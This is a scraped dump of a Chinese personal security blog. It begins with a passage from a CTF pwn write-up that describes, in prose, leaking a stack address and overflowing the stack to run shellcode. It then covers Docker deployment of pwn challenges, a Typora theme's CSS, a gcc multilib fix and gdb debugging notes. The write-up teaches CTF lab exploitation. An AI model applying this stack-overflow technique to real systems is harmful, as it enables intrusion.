既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用sys_write 对栈上内存进行一个读取。 ​ 那么如何利用捏。 ​ 从这里我们可以清楚地看到，这几条指令分别设置了sys_write的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。 ​ mov ecx, esp将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。 ​ ![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png) ​ 其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。 ​ 当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。 ​ 这时候程序还是会按照原有的指令执行，比如说下一个sys_read函数。 ​ 这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，sys_read会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20） ​ 然后直接溢出到栈地址。 ​ 执行shellcode ​ hhx 4）总结​ 这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。 ​ 动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！ ​ 另外容器要记得及时备份55. ​ 还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。 ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"基于ctf pwn环境的docker搭建","slug":"基于ctf pwn环境的docker配置","date":"2021-10-31T15:04:01.604Z","updated":"2022-03-20T04:30:41.353Z","comments":true,"path":"2021/10/31/基于ctf pwn环境的docker配置/","link":"","permalink":"https://fuurinko.github.io/2021/10/31/%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/","excerpt":"","text":"​ 最近为了校内的萌新赛，需要出一些简单的pwn题，然后把它们搓进docker。虽然步骤并不是非常复杂，而且有现成的框架，但我发现如果纯粹按照网上框架的一件脚本运行的话，遇到报错根本无法解决，所以看图说话之外我还需要较为系统地学习docker知识。 docker基础架构​ 对于docker，在了解基础命令之前我们需要了解的就是，容器以及虚拟化的大致概念。 1.1 为什么要有docker？​ 一个程序运行也许需要严苛的环境条件，也许一个微小的环境变量的差异，将导致程序的崩溃，因此在软件开发的过程中，统一环境是一件很重要的事。 ​ 为了解决这个问题，我们可以使用虚拟机，将程序同操作系统一起打包，这样确实避免了因为环境问题导致的程序的bug。 ​ 但是虚拟机通常体积庞大，且启动时间缓慢，资源占用多。所以相比于纯粹使用虚拟机，我们希望使用一些更轻盈的虚拟化工具来解决问题。而容器化技术应运而生，也就是Linux 容器（Linux Containers）。 ​ linux容器并不是完整的操作系统，容器化对进程隔离，使得不同的容器共享内核，但是调用的各种资源是虚拟的。容器化就像在正常的进程外伪装了一层外壳，使得壳内的进程认为自己是在一个全新的环境中运行，所以很自然的，容器中的应用启动速度快，资源占用少，并且体积轻巧。 ​ 而Docker的存在为我们提供了Linux容器的封装,提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。 1.2 docker基础知识​ 之前说到，Docker提供了Linux容器的封装，运用Docker实现容器化也十分简单，我们只需要有image文件，再通过docker创建镜像的容器，就能够在容器中运行我们想要的程序。 ​ image文件，顾名思义，类似系统iso，它包含应用程序以及运行它所必需的依赖，Docker通过image文件生成一个个运行的容器。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。 1.3 docker基础命令​ 首先我们需要拉取镜像至本地，可以通过docker pull命令。例如： 1$ docker image pull library/hello-world ​ ​ 拉取镜像需要一定时间的等待，拉取完成后，通过docker image ls可以查看本地的docker镜像。 ​ ​ 这个hello world其实就是被打包好的在特定环境下的程序，我们可以通过docker cantainer run hello-world指令将镜像创建为容器并运行。 docker build​ build指令使用dockerfile来创建新的容器。一般来说简单的构建命令就是 1$ docker build -t imagename . ​ 虽然我不是很理解这个-t 的参数意义何在，并且镜像名后面的“.”是干啥的。 docker run​ 创建一个新的容器并运行 ​ 一般来说会有这几个参数 123456789-d: 后台运行容器，并返回容器ID；-it: 以交互模式运行容器，并创建一个伪终端；-p: 指定端口映射，格式为：主机(宿主)端口:容器端口--name=&quot;nginx-lb&quot;: 为容器指定一个名称；-v：映射主机文件夹至容器内 docker start/stop/retart​ 启动或停止容器。 ​ 指令为docker start/stop/retart containerID docker pause​ 暂停容器内全部进程。 docker kill​ kill 运行的容器进程 docker ps​ 列出容器。 1-a :显示所有的容器，包括未运行的。 docker attach​ 连接到正在运行中的容器。 docker attach containerID docker inspect​ 获取容器/镜像的元数据。 简单的docker搭建步骤​ 熟悉docker基础操作后，开始搭建docker啦！！ ​ 首先是脚本的选择，pwn的docker脚本其实很多，这里随便选一个最基础的ctf_xinted。 ​ 首先我们需要做的是把项目clone到本地。 ​ 通过指令cat Dockerfile可以看到dockerfile。 ​ dockerfile是用来构建docker镜像的，里面包含了构建docker镜像构建的一些步骤和说明。一般来说如果要打包自己的环境的话，需要写dockerfile来供别人使用。这里我们直接切换到ctf_xinetd的文件夹下，然后执行 1sudo docker build -t &quot;helloworld&quot; . ​ (注意后面的“.”) ​ 这个时候一般就会创建helloworld这个镜像，我们只需要等待创建结束，然后执行 1sudo docker run -d -p &quot;0.0.0.0:10001:9999&quot; -h &quot;helloworld&quot; --name=&quot;helloworld&quot; helloworld ​ 0.0.0.0表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。 ​ 如果运行正常，此时我们是能够通过 nc 0.0.0.0 10001来连接我们的docker容器的。 ​ 但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样 1sudo service docker restart ​ 这样这个pwn题的docker就算部署完成了，你只需要把你自己的题目放置在容器中，并修改对应的flag就行。 ​ 但是目前来说这个框架存在一些局限性，比如说一次只能部署一道题等。 ​ 所以我们可以更换另外一个脚本进行docker镜像的创建。 ​ 这里我们选择https://github.com/giantbranch/pwn_deploy_chroot.git，这个脚本。 ​ 然后有个比较全面的教程，链接在这里：如何安全快速地部署多道ctf%20pwn比赛题目 ​ 就是把文件放到bin文件夹，然后 12python initialize.pydocker-compose up --build -d # please run as root ​ 这样就生成了一个总的镜像，每道题通过不同端口映射，然后分别有各自的flag。 ​ 在完成镜像的创建后，还需要在做题平台中填写相关镜像。 ​ 因为我们的CTFd是二次开发的，一般的CTFd的题目分类是有个dynamic docker，但是我们的平台只有一个kube类型。但是里面的东西还是八九不离十，然后对于指定题目，你需要填写你的docker image。并且指定暴露端口。 ​ 然后我这个萌新就被狠狠地坑了，一开始费了好大劲从0学习docker（虽然不难），然后通过别人的框架部署题目，创建好镜像，照猫画虎指定ip和端口运行容器，最后打开CTFd，就直接把docker image那一空给填成自己启动容器的那串ip了，然后端口也傻傻地不知道怎么搞，然后随便乱输一通，结果狠狠地靶机notready了。 ​ 直到下午我突然意识到哪里不对，然后去搜了一下，发现别人填的和我填的好像不太一样，找胖爷爷确认了一下，果然是要填docker hub里的镜像名哇。 ​ 然后又狠狠地push了镜像，在CTFd填了镜像的名字，然后端口就是初始化时每个二进制文件对应的那个映射的端口，这下总算靶机ready了。并且顺利通过测试。 ​ 好！ ​ ​ ​ 参考Docker 入门教程 Docker 镜像使用 ​ ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"typora主题配置的一些心得","slug":"typora主题配置的一些心得","date":"2021-10-29T15:20:57.419Z","updated":"2022-03-20T04:33:08.595Z","comments":true,"path":"2021/10/29/typora主题配置的一些心得/","link":"","permalink":"https://fuurinko.github.io/2021/10/29/typora%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","excerpt":"","text":"1）​ 由于看腻了typora原主题的python高亮的丑兮兮的屎黄色注释，决定换个主题。然而找遍整个主题列表，并没有我看得上的主题。本来打算作罢，但想起最近因为写小程序，学了一些简单的css，是不是可以尝试一下修改某些主题的css文件，打造一个自己喜欢的主题捏。 2）​ 在下载主题的过程中我大致了解了一下typora主题开发的大致内容，其实主体感觉就是css（除了css，就是各种需要的字体。 ​ 这里以主题mint为例，css中:root元素声明了全局css变量，如下： 123456789101112 :root &#123; --side-bar-bg-color: #ffffff;//边栏颜色 --control-text-color: #6B6B6B;//边栏文件未选中字体颜色 --active-file-bg-color: #ecf6f2;//边栏文件背景颜色 --active-file-border-color: #6B6B6B;//不清楚是个啥 --active-file-text-color: #202020;//边栏文件选中后字体颜色 --table-even-row-color:#f8fcfa;//不清楚是个啥 --table-head-color:#d9ede5;//不清楚是个啥 --deep-theme-color: #c2e2d5;//深色模式主题色 --code-block-bg-color: #0F111A;//代码块字体颜色以及代码块边框颜色 &#125; ​ 所以如果想修改各种配色，只需要修改对应颜色的hex就行。 ​ 这个比较难搞的是猜测各种元素对应的含义（（需要手动去尝试。但是就算是这样还是有几个元素没有试出来到底是哪一块的配色，似乎typora也没有类似的官方文档来规定每个div的名字（（ ​ 然后需要修改的是代码高亮的一些相关配色，typora的代码高亮是直接用的css而不是引用highlight.js（感觉也差不多233）。 ​ 然后我们找到代码高亮的css元素（其他的基本都是字体以及留白的一些样式，没有需求可以不用管）,找到对应的元素就可以开始魔改（ ​ (ps:感觉typora还有很多主题的方法可以使用，比如说backgroud = url（），通过这个 插入图片等，但是好像并没有找到类似的文档，我也不想再切图，于是作罢) ​ 其实魔改以后感觉变化也不是特别大，但是魔改的过程还是很有意思。 ​ 顺便附上它的css 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493 :root &#123; --side-bar-bg-color: #ffffff; --control-text-color: #424242; --active-file-bg-color: #ffffff; --active-file-border-color: #6B6B6B; --active-file-text-color: #7eadad; --table-even-row-color:#555555; --table-head-color:#7a7979; --deep-theme-color: #343a41; --code-block-bg-color: #292424; &#125;/*serif*/@font-face &#123; font-family: &#x27;Lexend&#x27;; font-weight: normal; font-style: normal; src: url(&#x27;./mint/Lexend-Regular.ttf&#x27;) &#125;@font-face &#123; font-family: &#x27;Lexend&#x27;; font-weight: bold; font-style: normal; src: url(&#x27;./mint/Lexend-Bold.ttf&#x27;) &#125;/*monospace*/@font-face &#123; font-family: &#x27;SourceCodePro&#x27;; font-weight: normal; font-style: normal; src: local(SourceCodePro), url(&#x27;./mint/SourceCodePro-Regular.ttf&#x27;)&#125;/*Chinese*/@font-face &#123; font-family: &#x27;NotoSansSC&#x27;; font-weight: normal; font-style: normal; src: url(&#x27;./mint/NotoSansSC-Regular.otf&#x27;)&#125;@font-face &#123; font-family: &#x27;NotoSansSC&#x27;; font-weight: bold; font-style: normal; src: url(&#x27;./mint/NotoSansSC-Bold.otf&#x27;)&#125;html&#123; font-size: 16px;&#125;body &#123; font-family: &#x27;Lexend&#x27;,&#x27;SourceCodePro&#x27;,&#x27;NotoSansSC&#x27;; font-weight: normal; line-height: 1.5rem; letter-spacing: 0; margin: 0;&#125;#write &#123; max-width: 900px; padding: 30px 50px 20px;&#125;#write p&#123; text-align:left;&#125;#write pre.md-meta-block &#123; padding: 1rem; font-size: 85%; line-height: 1.45; background-color: #ffffff; border: 0; border-radius: 3px; color: #141414; margin-top: 0 !important;&#125;.md-image&gt;.md-meta &#123; color: #141414; font-size: 0.9rem; font-family: &#x27;Lexend&#x27;; padding: 4px 0;&#125;@media print &#123; html,body &#123; font-size: 14px; &#125; table, pre &#123; page-break-inside: avoid; &#125; pre &#123; word-wrap: break-word; &#125; &#125;@page &#123; size: A4; margin: 8mm 0mm;&#125;/*toc*/.md-toc &#123; margin-top:20px; padding-bottom:20px; color: var(--deep-theme-color);&#125;a &#123; color: var(--deep-theme-color); text-decoration: none;&#125;a:hover &#123; text-decoration: underline;&#125;/*headers*/h1,h2,h3,h4,h5,h6 &#123; display: block; font-weight:bold;&#125;h1 &#123; font-size: 2em; margin-top: 0.67em; margin-bottom: 0.67em;&#125;h2 &#123; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em;&#125;h3 &#123; font-size: 1.17em; margin-top: 1em; margin-bottom: 1em;&#125;h4 &#123; font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em;&#125;h5 &#123; font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; color: #777777;&#125;h6 &#123; font-size: 1em; margin-top: 1.33em; margin-bottom: 1.33em; color: #adadad;&#125;p,blockquote,ul,ol,dl,table &#123; margin: 0.8rem 0;&#125;/*table*/table &#123; border-collapse: collapse; padding: 0; word-break: initial; table-layout: fixed; width: 100%;&#125;table tr:nth-child(even)&#123; background-color: var(--table-even-row-color);&#125;thead&#123; background-color: var(--table-head-color);&#125;table th&#123; text-align: center; padding:6px 13px; border: 1px solid var(--table-head-color);&#125;table td&#123; padding:6px 13px; border: 1px solid var(--table-head-color);&#125;table tr&#123; padding:6px 13px; border: 1px solid var(--table-head-color);&#125;/*blockquote*/blockquote &#123; border-left: 0.2rem solid var(--side-bar-bg-color); color: #b4d8e9; font-family: &#x27;Lexend&#x27;,&#x27;NotoSansSC&#x27;; font-size: 0.9rem; padding-left: 2rem;&#125;/*list*/li p.first &#123; display: inline-block;&#125;ul,ol &#123; padding-left: 30px;&#125;ul:first-child,ol:first-child &#123; margin-top: 0;&#125;ul:last-child,ol:last-child &#123; margin-bottom: 0;&#125;.md-task-list-item:hover &gt; input:before,input[type=&#x27;checkbox&#x27;]:hover:before &#123; opacity: 1; transition: 0.5s; background-color: var(--side-bar-bg-color);&#125;.task-list-item input::before &#123; content: &quot;&quot;; display: inline-block; border-radius: 1.1rem; vertical-align: middle; border: 1.2px solid var(--deep-theme-color); background-color: #ffffff; width: 1.1rem; height: 1.1rem; margin-left: -0.1rem; margin-right: 0.1rem; margin-top: -0.68rem; &#125;.task-list-item input:checked::before &#123; padding-left: 0.125em; content: &#x27;✔&#x27;; color:white; background-color: var(--deep-theme-color); font-size: 0.8rem; line-height: 0.95rem; margin-top: -0.68rem; transition: background-color 200ms ease-in-out;&#125;.task-list-done &#123; text-decoration: line-through; color: #343a41;&#125;hr &#123; border-style: none; border-top-style: solid; border-color: #e7e7e7; border-width: 1px; margin: 2rem 0;&#125;/*highlight*/#write mark &#123; background-color: #c7ffe8; border-radius: 2px; color: rgb(44, 39, 39); padding: 0 4px; margin: 0 2px;&#125;/*inline code*/#write code,tt &#123; padding: 0.6px 4px; border-radius: 2px; background-color: rgba(238, 238, 238, 0.39); font-family: &#x27;SourceCodePro&#x27;,Consolas,Courier, Monospace; font-size: 0.9rem; color: #666666; margin: 0 2px;&#125;/*footnote*/#write .md-footnote &#123; color: #343a41; background-color: #e4e4e4;&#125;/*source code mode*/.cm-s-typora-default .cm-header &#123; color: #524a4a;&#125;.cm-s-typora-default .cm-link &#123; color:var(--deep-theme-color);&#125;/*code block*/#write .md-fences &#123; font-size: 1rem; margin: 0.2em 0; padding: 0.5em; border-radius: 3px; font-size: 0.9em; font-family: &#x27;SourceCodePro&#x27;,Consolas,Courier, Monospace ; background-color: #fffdfd; color: #a3a3a3; border: none; text-shadow: none;&#125;.md-fences .code-tooltip &#123; background-color: #ffffff;&#125;/* Name: material-ocean Author: Mattia Astorino (http://github.com/equinusocio) Website: https://material-theme.site/*/.cm-s-inner.CodeMirror &#123; background-color: #ffffff; color: #343a41;&#125;/*.cm-s-inner .CodeMirror-gutters &#123; background: #ffffff; color: #ffffff; border: none;&#125;*/.cm-s-inner .CodeMirror-linenumber &#123;color: #343a41;&#125;.cm-s-inner .CodeMirror-guttermarker &#123; color: #FFEE80; &#125;.cm-s-inner .CodeMirror-guttermarker-subtle &#123; color: #D0D0D0; &#125;/*.cm-s-inner .CodeMirror-cursor &#123; border-left: 1px solid #FFCC00;&#125;.cm-s-inner.cm-fat-cursor .CodeMirror-cursor &#123; background-color: #FFCC00 !important;&#125;.cm-s-inner .cm-animate-fat-cursor &#123; background-color: #FFCC00 !important;&#125;*/.cm-s-inner .CodeMirror-cursor &#123; border-left: 1px solid #A9B7C6; &#125;.cm-s-inner div.CodeMirror-cursor &#123; border-left: 1px solid #ffffff; &#125;.cm-s-inner div.CodeMirror-selected &#123; background: rgba(58, 58, 59, 0.2);&#125;.cm-s-inner.CodeMirror-focused div.CodeMirror-selected &#123; background: rgba(221, 224, 241, 0.2);&#125;.cm-s-inner .CodeMirror-selected&#123; background: #d6dce7 !important; &#125;.cm-s-inner .CodeMirror-selectedtext &#123; background: #dbdee6 !important; &#125;.cm-overlay.CodeMirror-selectedtext &#123; background: #B5D6FC !important; &#125;.cm-s-inner .CodeMirror-line::selection,.cm-s-inner .CodeMirror-line&gt;span::selection,.cm-s-inner .CodeMirror-line&gt;span&gt;span::selection &#123; background: rgba(221, 224, 241, 0.2);&#125;.cm-s-inner .CodeMirror-line::-moz-selection,.cm-s-inner .CodeMirror-line&gt;span::-moz-selection,.cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection &#123; background: rgba(221, 224, 241, 0.2);&#125;.cm-s-inner .CodeMirror-activeline-background &#123; background: #ffffff;&#125;.cm-s-inner .cm-keyword &#123; color: #8979c0;&#125;.cm-s-inner .cm-operator &#123; color: #25c494;&#125;.cm-s-inner .cm-variable-2 &#123; color: #4f5481;&#125;.cm-s-inner .cm-variable-3,.cm-s-inner .cm-type &#123; color: #f84f57;&#125;.cm-s-inner .cm-builtin &#123; color: #eca622;&#125;.cm-s-inner .cm-atom &#123; color: #F78C6C;&#125;.cm-s-inner .cm-number &#123; color: #ad7a83;&#125;.cm-s-inner .cm-def &#123; color: #82AAFF;&#125;.cm-s-inner .cm-string &#123; color: #70be26;&#125;.cm-s-inner .cm-string-2 &#123; color: #7a232e;&#125;.cm-s-inner .cm-comment &#123; color: #3a4677;&#125;.cm-s-inner .cm-variable &#123; color: #bb584b;&#125;.cm-s-inner .cm-tag &#123; color: #b44457;&#125;.cm-s-inner .cm-meta &#123; color: #b9b717;&#125;.cm-s-inner .cm-attribute &#123; color: #71498a;&#125;.cm-s-inner .cm-property &#123; color: #a075be;&#125;.cm-s-inner .cm-qualifier &#123; color: #f8ce11;&#125;.cm-s-inner .cm-variable-3,.cm-s-inner .cm-type &#123; color: #fce470;&#125;.cm-s-inner .cm-error &#123; color: rgba(255, 255, 255, 1.0); background-color: #FF5370;&#125;.cm-s-inner .CodeMirror-matchingbracket &#123; text-decoration: underline; color: white !important;&#125;","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"解决gcc无法编译32位程序的问题","slug":"解决gcc无法编译32位程序的问题","date":"2021-10-27T12:26:56.705Z","updated":"2022-03-20T04:30:46.669Z","comments":true,"path":"2021/10/27/解决gcc无法编译32位程序的问题/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"1）前言​ 之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。 2)过程​ 首先我们尝试编译32位程序，gcc报错： ​ 缺少头文件，实则是没有安装多架构gcc。 ​ 试图安装，失败，报错如下： ​ 这里有个坑了我好久的东西，就是这个报错 E: Unable to correct problems, you have held broken packages. ​ 无法修正问题，你持有held broken的软件包。 ​ 我一直没有理解正确这个held的意思，我以为是持有的意思，所以一直以来这句话在我眼中的意思是，你已经有这个软件包了，但是你不能安装。 ​ 但实际上，但凡熟悉过apt或者dkpg的一些命令，或者但凡对linux文件系统稍微熟悉一点都知道其实hold是为了防止更新不想更新的软件包，而特殊设置的功能。通过apt- mark或者dpkg命令 ，从apt-get中将特定的软件包的更新排除。而这道题的报错就是源于这点–gcc-7-multilib等依赖的软件包版本不对，但是由于held，所以并没有被更新。 ​ 但是通过dpkg --get-selections | grep hold指令查找held的软件包，并没有任何结果。 ​ 经过各种试错，找到了一个快速解决的方法。 1sudo aptitude install gcc-multilib aptitude与apt类似，也是包管理器。但是通过aptitude进行包管理，对于软件包依赖问题的处理更加细节。 ​ 下面是一些常用的命令 12345aptitude update #更新可用的包列表aptitude purge &lt;pkgname&gt; #删除包及其配置文件aptitude search &lt;pkgname&gt; #搜索包aptitude clean #删除下载的包文件aptitude autoclean #删除过期的包文件 aptitude执行起来和apt其实不太一样，比如 sudo aptitude install gcc-multilib 这个命令其实执行起来长这样： ​ 然后aptitude会问你 ​ 这里是最大的坑。如果是像我这种不想看英文按照习惯输Y的人，这里会踩一个大坑。 ​ 明确地告诉了我： 123456789The following actions will resolve these dependencies: Keep the following packages at their current version: ... ... ... Accept this solution? [Y/n/q/?] 保持下面软件包的版本不变，你接受这个解决方式吗？ 显然我不接受，只要摁下N，问题就解决了。 然后。自动执行gdb-multilib的安装。 问题解决。 3）总结​ 这个问题回过头来想，其实非常简单，如果清楚问题所在的话，只需要一行命令就能解决。当然并不是每个人都经验丰富，但是没有经验，可以积累经验，然而在积累的过程中，有些愚蠢的错误确实是不应该犯的。比如说，不认真看报错信息，或者提示，凭着感觉装。这是我在处理这种问题上最大的弱点。 ​ 一个原因是我骄傲自满了，我确实认为在这一步不会出错，但是实际上问题就是发生在这一步上，另外就是，全英文的屏显，没有人愿意仔细阅读，但是这点没有办法，绝对不可能调成中文，这里只能是说，慢慢看，仔细看 ，然后提升一下英语水平。（但是有一说一，英语母语的人可能都不愿意看吧） 4）参考【Ubuntu】aptitude命令详解 Unable to correct problems, you have held broken packages","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"}]},{"title":"pwntools(1)-- pwnlib.tube","slug":"pwntools（1）--pwnlib.tube","date":"2021-10-27T03:21:54.156Z","updated":"2022-03-20T04:32:40.240Z","comments":true,"path":"2021/10/27/pwntools（1）--pwnlib.tube/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/pwntools%EF%BC%881%EF%BC%89--pwnlib.tube/","excerpt":"","text":"0)preview​ 一般通过萌新一般在接触pwn的时候，一个必不可少的步骤就是下载pwntools，并且在自己人生第一个脚本上输入： 1from pwn import* ​ 我也如此。 ​ 在学习pwn知识快一年的今天，倘若还是对pwntools这个神一般的工具迷茫不解，那我确实还不是一个合格的pwn手。 ​ 这个系列的目的是通过简单的源码剖析，辅以相应的例题，探究pwn题，gdb调试，以及pwntools本身的一些玄学。 ​ 第一部分，则是一个至关重要的part–pwnlib.tube 1)进程间通信​ 在了解pwnlib.tube之前，我们需要知道linux进程间通信的一些基础知识，以下所有内容均参考自《csapp》 ​ tbc… ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"pwntools","slug":"pwntools","permalink":"https://fuurinko.github.io/tags/pwntools/"}]},{"title":"gdb附加调试的一些黑魔法","slug":"gdb附加调试的一些黑魔法","date":"2021-10-27T03:21:25.650Z","updated":"2022-03-20T04:31:29.905Z","comments":true,"path":"2021/10/27/gdb附加调试的一些黑魔法/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/","excerpt":"","text":"1）abstract​ 这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。 2）格式化字符串-cctf-pwn31）pause（p）导致ERROR: Could not find ELF base问题​ 在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样： 1234567891011121314151617181920212223242526Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.ERROR: Could not find ELF base!done.Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.done.Cannot access memory at address 0xf7fad924warning: Unable to find dynamic linker breakpoint function.GDB will be unable to debug shared library initializersand track explicitly loaded dynamic code.Failed to read a valid object file image from memory.ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!0xf7f85b59 in ?? ()ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base!ERROR: Could not find ELF base! ​ 首先需要知道这个报错的原因。 ​ 虽然我并没有查到ERROR: Could not find ELF base!这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。 ​ 那么进程中止的原因何在？ 解决方案​ 经过大师指点，这个问题其实是因为exp错误（ ​ 这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是elf base not found。 总结​ 如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。 3）__kernel_vsyscall？问题​ 上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在__kernel_vsyscall这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。 ​ 我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么__kernel_vsyscall是一个怎样的函数，为什么偏偏就断在它的身上呢？ 解决​ 在stackoverflow上，我们能够看出一些端倪。 ​ __kernel_vsyscal is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the sysenter instruction. ​ 这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。 ​ 所以出现 __kernel_vsyscal 意味着此刻程序正在进行系统调用。我们同时可以注意到，当 __kernel_vsyscal 函数执行完成，下一个函数则是read函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。 当然要结束这个函数我们只需要gdb finish。 或者直接使用gdb.attach(sh,”break xxx”)。 关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见： 4）gdb附加调试下断点的几种姿势。1）gdb.attach(p)2）gdb.attach(p,”break &lt;func name&gt;”)3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )5）p = gdb.debug(“elf”,”break &lt;func name&gt;” ) ​ 6）Linux Signal​ 在调试萌新赛题目的时候总是按ctrl+c试图终给程序一个断点，然后就报错。如图 ​ 感觉也不是段错误，反正类似。感觉有必要系统地了解一下linux的信号机制。 ​ 在CSAPP Chapter8 Section5中，我们能看到对于linux signal的详细解释。 ​ signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。 ​ csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。 ​ ​ 实际的信号不止这三十种。但是一般来说就是这些。 ）参考如何做到一边使用pwntools一边使用gdb下断点到main函数前","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"https://fuurinko.github.io/tags/gdb/"}]},{"title":"汇编小知识点","slug":"pwn基础","date":"2021-10-13T09:25:43.372Z","updated":"2022-03-20T04:32:16.597Z","comments":true,"path":"2021/10/13/pwn基础/","link":"","permalink":"https://fuurinko.github.io/2021/10/13/pwn%E5%9F%BA%E7%A1%80/","excerpt":"","text":"[TOC] 汇编语言1）寻址1/直接寻址12mov rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。 2/间接寻址间接在使用指针以及解引用的形式 1mov [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。 3/比例寻址例如在数组遍历中 123456.dataarrayD 1,2,3,4.codemov 